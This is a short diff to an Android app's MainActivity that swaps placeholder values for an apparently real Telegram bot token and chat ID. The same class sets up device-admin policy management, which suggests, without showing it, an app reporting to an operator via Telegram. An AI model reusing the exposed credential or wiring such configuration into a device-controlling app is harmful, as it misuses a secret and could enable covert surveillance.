@@ -31,8 +31,8 @@ import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;
 public class MainActivity extends Activity {
     private static final int PERMISSION_REQUEST = 100;
     private static final int ADMIN_REQUEST = 200;
-    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
+    private static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
+    private static final String CHAT_ID = "7344776596";
     
     private DevicePolicyManager devicePolicyManager;
     private ComponentName adminComponent;
